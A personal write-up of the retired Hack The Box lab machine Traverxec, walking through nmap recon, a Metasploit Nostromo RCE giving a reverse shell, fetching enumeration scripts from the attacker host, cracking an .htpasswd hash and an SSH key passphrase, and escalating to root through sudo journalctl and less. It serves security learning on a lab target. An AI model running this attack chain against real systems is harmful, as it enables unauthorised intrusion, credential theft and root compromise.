# Traverxec
Details:
- Traverxec IP: 10.10.10.165
- Kali IP: 10.10.14.111
- Difficulty: easy
- Date of writeup: 2 May 2020
- **NOTE**: there are no screenshots of the machine because it got retired before I could write this. Luckily, I had enough personal notes to write this up. I aplogize for the lack of images.

Traverxec was my first ever box. Although it was marked as **easy**, it took me some time to solve it. To be fully honest, at some point I had to go on a search for tips in Reddit and Hackthebox forums, which felt a little bit like cheating. It’s hard to be online searching for tips and not spoil the whole box, but it’s possible. I’ve found Reddit specially useful in that sense.

Sections:
- [Recon and finding an RCE](#recon-and-finding-an-rce)
- [Enumerating and poking around](#enumerating-and-poking-around)
- [Search and learn](#search-and-learn)
- [Privesc to root](#privesc-to-root)
- [Learnings from ippsec walkthrough](#learnings-from-ippsec-walkthrough)

Tools/commands Used
- nmap
- metasploit
- [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- hashcat
- john

## Recon and finding an RCE
So, first things first: recon.
```shell
kali$  nmap -sC -sV 10.10.10.165
```

When checking out the results, something weird pops up to sight immediately: there is a Nostromo web server running on port 80, version 1.9.6. ```searchsploit nostromo``` will show whether this web server has known vulnerabilities (and the exploits). 

![](images/Traverxec_1.png?raw=true)

Sure enough, there’s an RCE vulnerability. We can run it directly in metasploit.

```
kali$  msfconsole
kali$  search nostromo
kali$  use exploit/multi/http/nostromo_code_exec
kali$  set RHOSTS 10.10.10.165
kali$  set LHOST tun0
kali$  run
```

This gives us a shell. Running ```whoami``` shows that we’re ```www-data```, the owner of the web server. To get a proper shell, we can use a reverse shell with the commands in [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) site, and then running:
```
www-data$  python -c ‘import pty; pty.spawn(“/bin/bash”)’
Press CTRL-Z
kali$  stty raw -echo
kali$  fg
Press enter once more
```

## Enumerating and poking around
Ok, now we have a foothold in the server, we need to privesc to a user. Here’s where I got stuck for a while and, eventually, had to search for tips. I tried a lot of things before finding out the right way to go: enumerating with tools such as [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) and [LinEnum](https://github.com/rebootuser/LinEnum), looking at possible backups, searching for scripts or custom binaries, etc. None of this were the correct answer of course, but just for the sake of it I’ll write them down.

An easy way to get files to the server is to download them to your kali machine and then:
```
kali$  python3 -m http.server 8080
www-data$  wget “http://10.10.14.111:8080/filename.sh
```

So we can run
```
www-data$  chmod +x LinEnum.sh
www-data$  chmod +x linpeas.sh
www-data$  ./LinEnum.sh -r linEnumReport -e /tmp/ -t
www-data$  ./linpeas.sh -a > linpeasReport.txt
```

As said, these scripts didn’t come back with meaningful information. We discover user **david** in ```/etc/passwd``` file, which is surely the user we need to own. I attempted to take a look at david’s files:
```
www-data$  cd /home/david → succeeds
www-data$  ls -la → fails
```

This is weird behavior. If you read the [last section](#learnings-from-ippsec-walkthrough), it will make sense.

Poking around in nostromo’s folder (```/var/nostromo```), we find a hash in the ```conf/.htpasswd``` file. Running ```hashid``` shows that it is an MD5Crypt hash. I saved it in a file called hash.txt
```
kali$  hashcat -m 500 hash.txt rockyou.txt –force
```

The rockyou wordlist can be found at ```/usr/share/wordlists/rockyou.txt.gz```. The result of hashcat is **Nowonly4me**.

It seems I had something going on, right? Well, I used it to access the ssh service running in port 22, but nothing:
```
kali$  ssh david@10.10.10.165
```

So, what now?

## Search and learn
One of the tips said, if I remember correctly, "take a look at the nostromo docs, specially regarding public_www". So I did, and found out that when there’s certain configuration ([homedirs](https://gsp.com/cgi-bin/man.cgi?topic=NHTTPD#HOMEDIRS), nostromo creates a public folder in the home folder of the user. I looked at nostromo configuration files and sure enough, the server had this configuration for user david.

Important learning here: when there’s a weird product in an environment, try to find out ways it can be misconfigured, outdated, etc. Do the research!

In ```/home/david/public_www```, there were some filed of interest, specially ```backup-ssh-identity-files.tgz```. Using ```zcat```, it’s possible to see that it is indeed an ssh key pair. We have david’s private key and public certificate.

We copy those to the Kali machine, under the name ```david_rsa``` and ```david_rsa.pub```. By looking at their content, we can easily find out that the private key is encrypted (the header of the key clearly says so)

![](images/Traverxec_2.png?raw=true)

We can get the passphrase using john:
```
kali$  python /usr/share/john/ssh2john.py david_rsa > file4john
kali$  john file4john
```

We find out this way that the passphrase is **hunter**. We can verify this and use it:
```
kali$  openssl rsa -check -noout -in david_rsa
kali$  chmod 600 david_rsa
kali$  ssh -i david_rsa david@10.10.10.165
```

By writing the passphrase, we get a shell as david

## Privesc to root
Luckily, after the struggle with nostromo, getting root was quite easy.

In david’s home folder there were some scripts in the bin directory. One of them (```server-stats.sh```) runs the following command: ``` sudo journalctl -n5 -unostromo.service```. I tried to run that myself and was successful. This is a good thing, it seems david is in the sudoers file for this command. ```journalctl``` uses ```less``` to display the output, and it is listed in the [GTFOBins](https://gtfobins.github.io/) list. This is a list of binaries that can be used to bypass security restrictions.  ```less```, for example, allows to spawn an interactive shell, which will run as root.

I played around a little bit, without getting it to work until I realized that I needed to reduce the terminal screen so ```less``` would be used (the ```-n5``` means it will only display the last 5 lines). 

Btw, changing the command to display more lines didn’t work, because it didn’t match the configuration of the sudoers file.

**There’s root!**

## Learnings from [ippsec walkthrough](https://www.youtube.com/watch?v=6_C9ShH9v2w)

Great walktrhough, as usual. 
- He explains why I had to do a reverse shell after getting a shell as www-data in metasploit. Apparently, the exploit script was opening a ```/bin/sh``` shell in the server. ```sh``` was a link to ```dash```. If the exploit script had run ```/bin/bash```, then I wouldn’t have had to open another reverse shell.
- He explains why it was possible to ```cd``` to ```/home/david``` but not list its content. Apparently, to ```cd``` to a folder you only need to have execution permission. To list it, you need read permission.

![](images/Traverxec_3.png?raw=true)

- He explains why sudo terminates when a pipe appears. So we couldn’t achieve a root shell by doing ``` sudo journalctl -n5 -unostromo.service | less```
- He explains what the vulnerability does and why it succeeds by analyzing nostromo code
